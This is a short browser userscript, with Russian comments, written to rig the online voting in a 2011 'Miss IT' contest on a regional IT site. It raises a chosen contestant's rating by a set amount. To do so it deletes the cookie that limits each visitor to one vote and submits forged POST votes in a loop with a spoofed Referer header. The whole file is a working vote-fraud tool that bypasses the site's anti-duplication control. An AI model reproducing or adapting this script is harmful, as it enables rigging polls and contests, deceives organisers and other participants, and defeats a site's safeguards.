// ==UserScript==
// @name IT Miss Altay
// @namespace it-alttpp.ru/
// @version 1.0
// @author iv1
// @description Этот скрипт увеличит рейтинг любой участницы на любое колличество раз
// @include http://www.it-alttpp.ru/forms/vote_res.php
// ==/UserScript==

// Номер участницы
var itMissNum = 0xA;
// Насколько нужно увеличить рейтинг
var deltaRating = 10;

function del_cookie(name) {
	document.cookie = name +'=; expires=Thu, 01-Jan-70 00:00:01 GMT;';
} 

var xmlHttp = new XMLHttpRequest();
var postParam, postLength;

postParam = 'missnum=' + itMissNum.toString();
postLength = (postParam.length).toString();

var i;
for(i = 0; i < deltaRating; i++){
	del_cookie('old_date');
	xmlHttp.open('POST', '/forms/vote_res.php', false);
	xmlHttp.setRequestHeader('Referer', 'http://www.it-alttpp.ru/projects/miss-it/2011/miss.html');
	xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xmlHttp.setRequestHeader('Content-Length', postLength);
	xmlHttp.send(postParam);
	del_cookie('old_date');
}
window.location.href = 'http://www.it-alttpp.ru/forms/vote_res.php?method=stop';